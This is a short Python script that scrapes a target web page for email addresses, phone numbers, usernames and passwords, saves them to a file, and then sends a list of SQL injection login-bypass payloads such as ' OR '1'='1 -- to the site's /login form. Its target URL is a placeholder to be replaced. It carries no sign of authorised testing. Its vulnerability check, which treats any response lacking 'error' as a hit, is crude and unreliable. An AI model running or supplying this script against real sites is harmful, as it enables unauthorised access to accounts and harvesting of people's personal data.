import re
import requests
from bs4 import BeautifulSoup

# Regex patterns to detect sensitive data
EMAIL_REGEX = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
PHONE_REGEX = r'\+?\d[\d -]{8,}\d'
USERNAME_REGEX = r'(?:username|user)\b[:=]\s*["\']?(\w+)[ "\']?'
PASSWORD_REGEX = r'(?:password|pass)\b[:=]\s*["\']?(\w+)[ "\']?'

# SQL Injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 'a'='a' #"
]

# Output file to save results
OUTPUT_FILE = 'scraped_sensitive_data.txt'

def scrape_sensitive_data(url):
    try:
        # Fetch the HTML content of the page
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Failed to access {url}")
            return
        
        # Parse the HTML content
        soup = BeautifulSoup(response.text, 'html.parser')

        # Get all the text from the page
        page_text = soup.get_text()

        # Look for sensitive data
        emails = re.findall(EMAIL_REGEX, page_text)
        phone_numbers = re.findall(PHONE_REGEX, page_text)
        usernames = re.findall(USERNAME_REGEX, page_text)
        passwords = re.findall(PASSWORD_REGEX, page_text)

        # Save the results to a file
        with open(OUTPUT_FILE, 'w') as file:
            if emails:
                file.write("Emails found:\n")
                file.write('\n'.join(emails) + '\n')
            if phone_numbers:
                file.write("Phone numbers found:\n")
                file.write('\n'.join(phone_numbers) + '\n')
            if usernames:
                file.write("Usernames found:\n")
                file.write('\n'.join(usernames) + '\n')
            if passwords:
                file.write("Passwords found:\n")
                file.write('\n'.join(passwords) + '\n')

        # Display results in the console
        if emails:
            print("Emails found:", emails)
        if phone_numbers:
            print("Phone numbers found:", phone_numbers)
        if usernames:
            print("Usernames found:", usernames)
        if passwords:
            print("Passwords found:", passwords)

        if not any([emails, phone_numbers, usernames, passwords]):
            print("No sensitive data found.")
        
        # Look for potential SQL injection vulnerabilities
        test_sql_injection(url)

    except Exception as e:
        print(f"An error occurred: {e}")

def test_sql_injection(url):
    try:
        # SQL injection testing on a specific login form
        login_url = url + '/login'  # Example login form URL
        print(f"Testing SQL injection on: {login_url}")

        # Inject SQL payloads into 'username' and 'password' fields
        for payload in SQL_PAYLOADS:
            data = {
                'username': payload,
                'password': payload  # Testing with both fields
            }
            
            # Send POST request with SQL injection payload
            result = requests.post(login_url, data=data)
            
            if "error" not in result.text.lower():
                print(f"Potential SQL injection vulnerability detected with payload: {payload}")
            else:
                print(f"No vulnerability detected with payload: {payload}")

    except Exception as e:
        print(f"An error occurred during SQL injection testing: {e}")

# URL to be scraped
target_url = 'http://example.com'  # Replace with your target site
scrape_sensitive_data(target_url)
